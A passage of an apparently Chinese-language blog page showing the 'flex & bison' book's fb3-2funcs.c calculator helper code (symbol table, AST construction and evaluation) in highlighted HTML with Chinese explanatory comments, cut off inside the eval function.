class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2</span>funcs.c</span><br><span class="line"><span class="comment">/* Companion source code for "flex &amp; bison", published by O'Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2funcs.c,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * helper functions for fb3-2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这些是辅助函数：构造符号表、hash算法、查找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* symbol table */</span></span><br><span class="line"><span class="comment">/* hash a symbol */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span></span><br><span class="line">symhash(<span class="keyword">char</span> *sym)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(c = *sym++) hash = hash*<span class="number">9</span> ^ c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> symbol *</span><br><span class="line">lookup(<span class="keyword">char</span>* sym)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symbol *sp = &amp;symtab[symhash(sym)%NHASH];</span><br><span class="line">  <span class="keyword">int</span> scount = NHASH;        <span class="comment">/* how many have we looked at */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(--scount &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(sp-&gt;name &amp;&amp; !<span class="built_in">strcmp</span>(sp-&gt;name, sym)) &#123; <span class="keyword">return</span> sp; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!sp-&gt;name) &#123;        <span class="comment">/* new entry */</span></span><br><span class="line">      sp-&gt;name = strdup(sym);</span><br><span class="line">      sp-&gt;value = <span class="number">0</span>;</span><br><span class="line">      sp-&gt;func = <span class="literal">NULL</span>;</span><br><span class="line">      sp-&gt;syms = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">return</span> sp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(++sp &gt;= symtab+NHASH) sp = symtab; <span class="comment">/* try the next entry */</span></span><br><span class="line">  &#125;</span><br><span class="line">  yyerror(<span class="string">"symbol table overflow\n"</span>);</span><br><span class="line">  <span class="built_in">abort</span>(); <span class="comment">/* tried them all, table is full */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这是构造ast的函数，根据参数，填充ast的结构。</span></span><br><span class="line"><span class="comment">//填充 type，节点什么的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newast(<span class="keyword">int</span> nodetype, <span class="keyword">struct</span> ast *l, <span class="keyword">struct</span> ast *r)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> ast *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ast));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = nodetype;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;r = r;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//number的ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newnum(<span class="keyword">double</span> d)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> numval *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> numval));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'K'</span>;</span><br><span class="line">  a-&gt;number = d;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//比较表达式的ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newcmp(<span class="keyword">int</span> cmptype, <span class="keyword">struct</span> ast *l, <span class="keyword">struct</span> ast *r)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> ast *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ast));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'0'</span> + cmptype;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;r = r;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数的ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newfunc(<span class="keyword">int</span> functype, <span class="keyword">struct</span> ast *l)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> fncall *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fncall));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'F'</span>;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;functype = functype;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用的ast</span></span><br><span class="line"><span class="comment">// call funcname();这种</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newcall(<span class="keyword">struct</span> symbol *s, <span class="keyword">struct</span> ast *l)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> ufncall *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ufncall));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'C'</span>;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//引用的ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newref(<span class="keyword">struct</span> symbol *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symref *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> symref));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'N'</span>;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值表达式 ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newasgn(<span class="keyword">struct</span> symbol *s, <span class="keyword">struct</span> ast *v)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symasgn *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> symasgn));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">'='</span>;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  a-&gt;v = v;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//条件表达式的ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newflow(<span class="keyword">int</span> nodetype, <span class="keyword">struct</span> ast *cond, <span class="keyword">struct</span> ast *tl, <span class="keyword">struct</span> ast *el)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> flow *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> flow));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = nodetype;</span><br><span class="line">  a-&gt;cond = cond;</span><br><span class="line">  a-&gt;tl = tl;</span><br><span class="line">  a-&gt;el = el;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//符号list</span></span><br><span class="line"><span class="keyword">struct</span> symlist *</span><br><span class="line">newsymlist(<span class="keyword">struct</span> symbol *sym, <span class="keyword">struct</span> symlist *next)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symlist *sl = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> symlist));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!sl) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sl-&gt;sym = sym;</span><br><span class="line">  sl-&gt;next = next;</span><br><span class="line">  <span class="keyword">return</span> sl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放符号list</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">symlistfree(<span class="keyword">struct</span> symlist *sl)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symlist *nsl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(sl) &#123;</span><br><span class="line">    nsl = sl-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(sl);</span><br><span class="line">    sl = nsl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个函数</span></span><br><span class="line"><span class="comment">//func(parma1,parma2…);</span></span><br><span class="line"><span class="comment">/* define a function */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">dodef(<span class="keyword">struct</span> symbol *name, <span class="keyword">struct</span> symlist *syms, <span class="keyword">struct</span> ast *func)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(name-&gt;syms) symlistfree(name-&gt;syms);</span><br><span class="line">  <span class="keyword">if</span>(name-&gt;func) treefree(name-&gt;func);</span><br><span class="line">  name-&gt;syms = syms;</span><br><span class="line">  name-&gt;func = func;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">callbuiltin</span><span class="params">(<span class="keyword">struct</span> fncall *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">calluser</span><span class="params">(<span class="keyword">struct</span> ufncall *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ast求值</span></span><br><span class="line"><span class="keyword">double</span></span><br><span class="line">eval(<span class="keyword">struct</span> ast *a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">double</span> v;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"internal error, null eval"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line">    <span class="comment">/* constant */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'K'</span>: v = ((<span class="keyword">struct</span> numval *)a)-&gt;number; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* name reference */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'N'</span>: v = ((<span class="keyword">struct</span> symref *)a)-&gt;s-&gt;value; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* assignment */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'='</span>: v = ((<span class="keyword">struct</span> symasgn *)a)-&gt;s-&gt;value =</span><br><span class="line">      eval(((<span class="keyword">struct</span> symasgn *)a)-&gt;v); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* expressions */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'+'</span>: v = eval(a-&gt;l) + eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'-'</span>: v = eval(a-&gt;l) - eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'*'</span>: v = eval(a-&gt;l) * eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'/'</span>: v = eval(a-&gt;l) / eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>: v = <span class="built_in">fabs</span>(eval(a-&gt;l)); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'M'</span>: v = -eval(a-&gt;l); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* comparisons */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'1'</span>: v = (eval(a-&gt;l) &gt; eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'2'</span>: v = (eval(a-&gt;l) &lt; eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'3'</span>: v = (eval(a-&gt;l) != eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'4'</span>: v = (eval(a-&gt;l) == eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'5'</span>: v = (eval(a-&gt;l) &gt;= eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'6'</span>: v = (eval(a-&gt;l) &lt;= eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这部分是对条件表达式的ast的求值</span></span><br><span class="line">  <span class="comment">//比如if else 这些</span></span><br><span class="line">  <span class="comment">/* control flow */</span></span><br><span class="line">  <span class="comment">/* null if/else/do expressions allowed in the grammar, so check for them */</span></span><br><span class="line">  case 'I’:</span><br><span class="line">    <span class="comment">//条件成立，走then或者do的分支</span></span><br><span class="line">    <span class="keyword">if</span>( eval( ((<span class="keyword">struct</span> flow *)a)-&gt;cond) != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl) &#123;</span><br><span class="line">    v = eval( ((<span class="keyword">struct</span> flow *)a)-&gt;tl);</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    <span class="comment">//不成立，走else分支</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el) &#123;</span><br><span class="line">        v = eval(((<span class="keyword">struct</span> flow *)a)-&gt;el);</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// while语句</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    <span class="comment">//条件成立，走do的逻辑</span></span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl) &#123;</span><br><span class="line">      <span class="keyword">while</span>( eval(((<span class="keyword">struct</span> flow *)a)-&gt;cond) != <span class="number">0</span>)</span><br><span class="line">    v = eval(((<span class="keyword">struct</span> flow *)a)-&gt;tl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不成立，凉凉，啥都不做</span></span><br><span class="line">    <span class="keyword">break</span>;            <span class="comment">/* last value is value */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//语句列表</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'L'</span>: eval(a-&gt;l); v = eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//函数</span></span><br><span class="line">  <span class="comment">//func(param…);</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'F'</span>: v = callbuiltin((<span class="keyword">struct</span> fncall *)a); <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//用户调用部分</span></span><br><span class="line">  <span class="comment">//比如 call xxx();</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'C'</span>: v = calluser((<span class="keyword">struct</span> ufncall *)a); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">"internal error: bad node %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span 